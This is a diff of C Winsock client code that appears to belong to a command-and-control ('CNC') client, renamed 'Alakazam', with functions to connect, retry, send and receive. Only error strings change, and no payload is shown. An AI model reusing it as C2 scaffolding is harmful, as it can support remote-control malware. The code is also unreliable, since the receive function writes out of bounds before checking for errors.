@@ -27,7 +27,7 @@ struct addrinfo get_cnc_info() {
                                            .ai_protocol = IPPROTO_TCP};
   res = getaddrinfo(CNC_HOST, CNC_PORT, &hints, &result);
   if (res != 0) {
-    printf("Failed to get CNC info: %d\n", res);
+    printf("Failed to get Alakazam info: %d\n", res);
     WSACleanup();
     exit(1);
   }
@@ -39,7 +39,7 @@ void init_cnc_sock() {
   SOCKET *conn = malloc(sizeof(SOCKET));
   *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
   if (*conn == INVALID_SOCKET) {
-    printf("Error at CNC socket initialization: %d\n", WSAGetLastError());
+    printf("Error at Alakazam socket initialization: %d\n", WSAGetLastError());
     freeaddrinfo(&cncinfo);
     WSACleanup();
     exit(1);
@@ -59,7 +59,7 @@ void connect_to_cnc() {
       Sleep(RETRY_INTERVAL * 1000);
       connect_to_cnc();
     } else {
-      printf("Unable to connect to CNC: %d\n", WSAGetLastError());
+      printf("Unable to connect to Alakazam: %d\n", WSAGetLastError());
       WSACleanup();
       exit(1);
     }
@@ -77,7 +77,7 @@ void start_client() {
 void send_to_cnc(char *buf) {
   int res = send(*cnc, buf, strlen(buf), 0);
   if (res == SOCKET_ERROR) {
-    printf("Failed sending to CNC: %d\n", WSAGetLastError());
+    printf("Failed sending to Alakazam: %d\n", WSAGetLastError());
     exit(1);
   }
 }
@@ -87,7 +87,7 @@ char *recv_from_cnc(int bufsize) {
   int bytesread = recv(*cnc, buf, bufsize, 0);
   buf[bytesread] = '\0';
   if (bytesread == SOCKET_ERROR) {
-    printf("Failed receiving from CNC: %d\n", WSAGetLastError());
+    printf("Failed receiving from Alakazam: %d\n", WSAGetLastError());
     exit(1);
   } else if (bytesread == 0) {
     printf("Alakazam closed the connection.\n");
